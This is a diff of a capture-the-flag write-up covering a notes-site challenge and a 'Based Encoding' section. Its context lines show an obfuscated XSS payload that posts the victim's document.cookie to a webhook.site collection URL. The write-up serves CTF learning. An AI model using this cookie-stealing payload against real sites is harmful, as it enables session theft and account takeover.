@@ -78,6 +78,8 @@ To access the flag, go to: https://awesomenotes.online/note/flag and add a heade
 
 ### Based Encoding
 
+
+
 ![[Pasted image 20231014192249.png]]
 
 
@@ -95,6 +97,3 @@ However, this doesn't work because the base91 encoding is modified and doesn't u
 ```html
 <script>var xhr=new XMLHttpRequest();xhr["open"]("POST","https://webhook" +String["fromCharCode"](46) + "site/3aac4f80"+String["fromCharCode"](45) + "6b5b"+String["fromCharCode"](45) + "442e"+String["fromCharCode"](45) + "a93e"+String["fromCharCode"](45) +"a0503256d4c7",true);xhr["setRequestHeader"]("Content"+String["fromCharCode"](45) +"Type","application/x"+String["fromCharCode"](45) +"www"+String["fromCharCode"](45) +"form"+String["fromCharCode"](45) +"urlencoded");xhr["send"]("cookie="+encodeURIComponent(document["cookie"]));</script>
 ```
-
-
-
